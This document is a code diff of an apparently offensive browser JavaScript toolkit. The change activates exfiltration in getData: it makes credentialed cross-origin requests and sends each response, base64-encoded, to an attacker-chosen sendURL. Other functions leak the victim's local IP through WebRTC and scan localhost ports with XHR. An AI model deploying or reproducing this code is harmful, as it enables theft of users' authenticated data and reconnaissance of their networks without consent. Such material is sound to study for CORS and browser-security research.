@@ -1,51 +1,55 @@
-function getData(reqURL) {
-	var doPOST = false;
-	// var sendURL = 'https://localhost:58081';
+function getData(reqURL, doPOST, sendURL, force_preflight) {
 	var req = new XMLHttpRequest();
 	if (doPOST) {
-		console.log("POSTing to " + reqURL);
-		req.open("POST",reqURL);
-		req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		logToConsole('POSTing to ' + reqURL);
+		req.open('POST',reqURL);
+		req.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
 	} else {
-		console.log("GETting " + reqURL);
-		req.open("GET",reqURL);
+		logToConsole('GETting ' + reqURL);
+		req.open('GET', reqURL);
 	}
 	req.withCredentials = true;
-	// req.setRequestHeader("X-Foo", "Custom header");
+	if (force_preflight) {
+		req.setRequestHeader('X-Foo', 'Custom header');
+	}
 	req.onreadystatechange = function reqListener(){
 		if (this.readyState != 4) { return; }
-		logData(this.responseText);
-		// var exf = new XMLHttpRequest();
-		// exf.open('GET', sendURL+'/?STATUS='+this.status+'?CONTENT='+btoa(escape(this.responseText)));
-		// exf.send();
+		logToPage(this.responseText);
+		if (sendURL) {
+			// not tested with old browsers
+			var exf = new XMLHttpRequest();
+			exf.open('GET', sendURL+'/?STATUS='+this.status+'?CONTENT='+btoa(escape(this.responseText)));
+			exf.send();
+		}
 	};
 	if (doPOST) {
-		var data = {};
-		req.send(JSON.stringify(data));
+		req.send(JSON.stringify({}));
 	} else {
 		req.send();
 	}
 };
 
-function logData(data) {
+function logToPage(msg) {
 	var log = $('#log');
 	if (log.length === 0) {
-		log = $('<div></div>');
-		log.id = 'log';
-		$('body').append(log);
-		console.log('Created log div');
+		log = $('<div></div>', {id: 'log'}).appendTo('body');
+		logToConsole('Created log div');
 	}
 	else {
-		console.log('Using old log div');
+		logToConsole('Using old log div');
 	}
-	console.log('Got data: ' + data);
+	logToConsole(msg);
 	err = $('<p>');
-	err.text(data);
+	err.text(msg);
 	log.append(err)
 };
 
+function logToConsole(msg) {
+	if (typeof DEBUG !== 'undefined' && DEBUG) { console.log(msg); }
+};
+
 function getPar(docLocation, parname) {
-	// pass document.location
+	// pass me document.location
 	pars = document.location.search.slice(1).split('&');
 	for (i = 0; i < pars.length; i++){
 		if (pars[i].substr(0, parname.length) === parname) {
@@ -64,7 +68,7 @@ function getMyIP(cbk) {
 		if (ice && ice.candidate && ice.candidate.candidate)
 		{
 			var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
-			logData('my IP: ' + myIP);
+			logToPage('my IP: ' + myIP);
 			cbk(myIP);
 			pc.onicecandidate = noop;
 		}
@@ -81,38 +85,38 @@ function enumPorts(ports, cbk) {
 		var port = ports[i];
 		var oReq = new XMLHttpRequest();
 		oReq.timeout = 1000;
-		// logData('GET https://localhost:' + port);
+		// logToPage('GET https://localhost:' + port);
 		oReq.open('GET', 'https://localhost:' + port, true);
 		// oReq.onreadystatechange = function(){
 		//   elapsed = Date.now() - startms;
-		//   logData('[' + port + '] ' + elapsed + 'ms: state is ' + oReq.readyState + ' + status is ' + oReq.status);
+		//   logToPage('[' + port + '] ' + elapsed + 'ms: state is ' + oReq.readyState + ' + status is ' + oReq.status);
 		// };
 		// oReq.onerror = function(){
 		//   elapsed = Date.now() - startms;
-		//   logData('[' + port + '] ' + elapsed + 'ms: ERROR');
+		//   logToPage('[' + port + '] ' + elapsed + 'ms: ERROR');
 		// };
 		oReq.onload = function(){
 		//   elapsed = Date.now() - startms;
-		//   logData('[' + port + '] ' + elapsed + 'ms: LOAD');
-			logData('Port ' + port + ' is OPEN [got response]');
+		//   logToPage('[' + port + '] ' + elapsed + 'ms: LOAD');
+			logToPage('Port ' + port + ' is OPEN [got response]');
 			cbk(port);
 		};
 		// oReq.onloadend = function(){
 		//   elapsed = Date.now() - startms;
-		//   logData('[' + port + '] ' + elapsed + 'ms: LOADEND');
+		//   logToPage('[' + port + '] ' + elapsed + 'ms: LOADEND');
 		// };
 		// oReq.onloadstart = function(){
 		//   elapsed = Date.now() - startms;
-		//   logData('[' + port + '] ' + elapsed + 'ms: LOADSTART');
+		//   logToPage('[' + port + '] ' + elapsed + 'ms: LOADSTART');
 		// };
 		// oReq.onprogress = function(){
 		//   elapsed = Date.now() - startms;
-		//   logData('[' + port + '] ' + elapsed + 'ms: PROGRESS');
+		//   logToPage('[' + port + '] ' + elapsed + 'ms: PROGRESS');
 		// };
 		oReq.ontimeout = function(){
 			// elapsed = Date.now() - startms;
-			// logData('[' + port + '] ' + elapsed + 'ms: TIMEOUT');
-			logData('Port ' + port + ' is OPEN/FILTERED [no response]');
+			// logToPage('[' + port + '] ' + elapsed + 'ms: TIMEOUT');
+			logToPage('Port ' + port + ' is OPEN/FILTERED [no response]');
 			cbk(port);
 		};
 		var startms = Date.now();
@@ -128,7 +132,7 @@ function enumPorts(ports, cbk) {
 function writeFile(filename) {
 	function errorHandler(e) {
 		var msg = '';
-		logData(e.message);
+		logToPage(e.message);
 
 		switch (e.code) {
 			case FileError.QUOTA_EXCEEDED_ERR:
@@ -151,15 +155,15 @@ function writeFile(filename) {
 				break;
 		};
 
-		logData('Error: ' + msg);
+		logToPage('Error: ' + msg);
 	}
 
 	function onInitFs(fs) {
 		fs.root.getFile(filename, {create: true, exclusive: true}, function(fileEntry) {
-			logData('Created file "' + fileEntry.fullPath + '"');
-			logData(fileEntry);
+			logToPage('Created file "' + fileEntry.fullPath + '"');
+			logToPage(fileEntry);
 		}, errorHandler);
-		logData('created');
+		logToPage('created');
 
 		fs.root.getFile(filename, {create: false, exclusive: false}, function(fileEntry) {
 			fileEntry.createWriter(function(fileWriter) {
@@ -167,13 +171,13 @@ function writeFile(filename) {
 				var blob = new Blob(['Hello World'], {type: 'text/plain'});
 				fileWriter.write(blob);
 			}, errorHandler);
-		logData('wrote');
+		logToPage('wrote');
 
 		fs.root.getFile(filename, {create: false, exclusive: false}, function(fileEntry) {
 			fileEntry.file(function(file) {
 				var reader = new FileReader();
 				reader.onloadend = function(e) {
-					logData('Read: ' + this.result);
+					logToPage('Read: ' + this.result);
 				};
 				reader.readAsText(file);
 			}, errorHandler);
